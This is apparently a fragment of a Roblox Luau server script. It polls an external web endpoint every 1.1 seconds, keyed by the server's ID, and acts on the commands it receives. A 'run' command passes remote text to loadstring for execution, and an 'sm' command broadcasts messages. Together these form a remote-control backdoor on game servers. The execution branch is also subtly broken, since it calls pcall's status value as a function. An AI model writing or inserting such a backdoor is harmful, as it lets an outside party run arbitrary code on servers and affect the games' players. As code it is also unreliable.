task.defer(function()
	local id
	local sidObject = ReplicatedStorage:FindFirstChild("ServerId")
	if sidObject then
		repeat
			task.wait()
		until sidObject.Value ~= 0

		id = sidObject.Value
	else
		id = game.JobId
	end

	while true do
		local s, data = pcall(function()
			return HttpService:GetAsync(`https://alias-colorful.vercel.app/api/get?id={id}`)
		end)

		if not s then
			warn("HTTP Request Failed:", data)
		elseif data then
			local js, json = pcall(function()
				return HttpService:JSONDecode(data)
			end)

			if js then
				for _, message in json.messages do
					local content = message.message
					print(content)

					local parsed = parse(content)
					if typeof(parsed) ~= "table" then
						return
					end

					local cmd = table.remove(parsed, 1)

					if cmd == "run" and parsed[1] then
						local fn = pcall(loadstring, parsed[1])
						if fn then
							fn()
						end
					elseif cmd == "sm" and parsed[1] then
						if nature3d then
							nature3d.message(string.gsub(parsed[1], "\\n", "\n"))
						end
					end
				end
			end
		end

		task.wait(1.1)
	end
end)
